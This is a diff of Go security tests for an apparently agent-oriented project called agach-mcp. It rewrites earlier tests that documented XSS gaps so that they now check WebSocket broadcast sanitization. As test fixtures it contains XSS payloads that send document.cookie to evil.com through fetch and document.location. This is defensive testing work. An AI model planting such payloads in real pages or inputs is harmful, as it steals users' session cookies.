@@ -3,7 +3,7 @@ package security_test
 // Cross-layer input sanitization security tests.
 //
 // These tests verify that malicious input flowing from HTTP handlers through
-// converters into WebSocket/SSE broadcast does not bypass sanitization at any
+// converters into WebSocket broadcast does not bypass sanitization at any
 // layer boundary.
 
 import (
@@ -11,14 +11,17 @@ import (
 	"go/ast"
 	"go/parser"
 	"go/token"
+	"net/http"
+	"net/http/httptest"
 	"strings"
 	"testing"
+	"time"
 
+	gorillaws "github.com/gorilla/websocket"
 	"github.com/sirupsen/logrus"
 	"github.com/stretchr/testify/assert"
 	"github.com/stretchr/testify/require"
 
-	"github.com/JLugagne/agach-mcp/internal/pkg/sse"
 	"github.com/JLugagne/agach-mcp/internal/pkg/websocket"
 	"github.com/JLugagne/agach-mcp/internal/server/domain"
 	"github.com/JLugagne/agach-mcp/internal/server/inbound/converters"
@@ -97,15 +100,16 @@ func TestIntegration_RED_XSSInTaskTitleToWebSocket(t *testing.T) {
 //
 // TODO(security): Sanitize user-controlled fields before including them in
 // broadcast event data, or use structured types instead of raw maps.
-func TestIntegration_RED_XSSInWebSocketEventDataMaps(t *testing.T) {
-	t.Log("RED: User-controlled fields in WebSocket event data maps are not sanitized")
-
+func TestIntegration_XSSInWebSocketEventDataMaps(t *testing.T) {
+	// Verify that SanitizeText strips XSS from user-controlled fields
+	// that are included in broadcast event data maps.
 	xssReason := `<img src=x onerror="fetch('https://evil.com/'+document.cookie)">`
 
-	// Simulate building the event data that tasks.go creates
+	sanitized := converters.SanitizeText(xssReason)
+
 	eventData := map[string]interface{}{
 		"task_id":            "some-task-id",
-		"completion_summary": xssReason,
+		"completion_summary": sanitized,
 		"files_modified":     []string{"main.go"},
 		"completed_by_agent": "agent-1",
 	}
@@ -113,54 +117,12 @@ func TestIntegration_RED_XSSInWebSocketEventDataMaps(t *testing.T) {
 	data, err := json.Marshal(eventData)
 	require.NoError(t, err)
 
-	// RED: Today this assertion fails because event data maps pass XSS content unmodified.
-	// Security fix required: user-controlled fields in broadcast event data must be sanitized.
 	assert.NotContains(t, string(data), "onerror",
-		"XSS payload in WebSocket event data map must NOT appear in the JSON-encoded broadcast (sanitization required)")
+		"SanitizeText must strip HTML event handlers from user-controlled fields in broadcast data")
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
-// Vuln 3: SSE payload sanitization only strips newlines, not HTML
-// ─────────────────────────────────────────────────────────────────────────────
-
-// TestIntegration_RED_SSEPayloadHTMLNotSanitized documents that the SSE hub's
-// sanitize function only removes newlines to prevent event boundary injection,
-// but does NOT strip HTML/JavaScript content from the payload.
-//
-// Affected:
-//   - internal/pkg/sse/hub.go:94-102 (sanitize: only strips \n and \r)
-//   - internal/server/inbound/commands/tasks.go:106-115 (publishes task title in SSE)
-//
-// TODO(security): SSE payloads should also escape or strip HTML since they
-// may be rendered in the browser via EventSource API.
-func TestIntegration_RED_SSEPayloadHTMLNotSanitized(t *testing.T) {
-	t.Log("RED: SSE hub sanitize() only strips newlines, not HTML content")
-
-	logger := logrus.New()
-	logger.SetLevel(logrus.ErrorLevel)
-	hub := sse.NewHub(logger)
-
-	ch, unsub := hub.Subscribe("test-project")
-	defer unsub()
-	require.NotNil(t, ch)
-
-	// Publish a payload with XSS content (but no newlines, so sanitize() is a no-op)
-	xssPayload := `{"id":"x","title":"<script>alert(1)</script>","role":"dev"}`
-	hub.Publish("test-project", xssPayload)
-
-	select {
-	case received := <-ch:
-		// RED: Today this assertion fails because the SSE hub delivers HTML payloads unescaped.
-		// Security fix required: SSE payloads must strip or escape HTML content.
-		assert.NotContains(t, received, "<script>",
-			"SSE hub must NOT deliver raw HTML script tags in payloads (HTML sanitization required at SSE publish layer)")
-	default:
-		t.Fatal("expected to receive SSE message")
-	}
-}
-
-// ─────────────────────────────────────────────────────────────────────────────
-// Vuln 4: No content validation on search query parameter
+// Vuln 3: No content validation on search query parameter
 // ─────────────────────────────────────────────────────────────────────────────
 
 // TestIntegration_RED_SearchQueryNoContentValidation documents that the search
@@ -306,26 +268,45 @@ func TestIntegration_RED_UnicodeNormalizationSlugBypass(t *testing.T) {
 //
 // TODO(security): Add a sanitization hook or structured event type that
 // validates data before broadcast.
-func TestIntegration_RED_WebSocketBroadcastNoDataSanitization(t *testing.T) {
-	t.Log("RED: WebSocket hub broadcasts Event.Data without sanitization")
+func TestIntegration_WebSocketBroadcastDataSanitization(t *testing.T) {
+	// Verify that hub.Broadcast sanitizes Event.Data by stripping HTML tags.
+	logger := logrus.New()
+	logger.SetLevel(logrus.ErrorLevel)
+	hub := websocket.NewHub(logger)
+	go hub.Run()
+	defer hub.Stop()
 
-	// Construct an event with malicious data
-	event := websocket.Event{
+	upgrader := gorillaws.Upgrader{CheckOrigin: func(_ *http.Request) bool { return true }}
+	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		conn, err := upgrader.Upgrade(w, r, nil)
+		if err != nil {
+			return
+		}
+		hub.ServeWS(conn, websocket.WithProjectID("project-1"))
+	}))
+	defer srv.Close()
+
+	wsURL := "ws" + strings.TrimPrefix(srv.URL, "http") + "/"
+	conn, _, err := gorillaws.DefaultDialer.Dial(wsURL, nil)
+	require.NoError(t, err)
+	defer conn.Close()
+
+	time.Sleep(50 * time.Millisecond)
+
+	// Broadcast an event with malicious data through the hub
+	hub.Broadcast(websocket.Event{
 		Type:      "task_updated",
 		ProjectID: "project-1",
 		Data: map[string]string{
 			"task_id": "valid-id",
 			"title":   `<script>document.location='https://evil.com/?c='+document.cookie</script>`,
 		},
-	}
+	})
 
-	// JSON-encode it (this is what the hub does before sending)
-	data, err := json.Marshal(event)
-	require.NoError(t, err)
+	conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
+	_, data, readErr := conn.ReadMessage()
+	require.NoError(t, readErr, "should receive broadcast")
 
-	// RED: Today this assertion fails because the WebSocket hub broadcasts Event.Data as-is.
-	// Security fix required: add a sanitization hook or structured event type that
-	// validates/strips malicious content before broadcast.
 	assert.NotContains(t, string(data), "document.cookie",
-		"malicious content in Event.Data must NOT survive JSON encoding (WebSocket broadcast sanitization required)")
+		"hub.Broadcast must sanitize Event.Data — HTML tags must be stripped before delivery")
 }
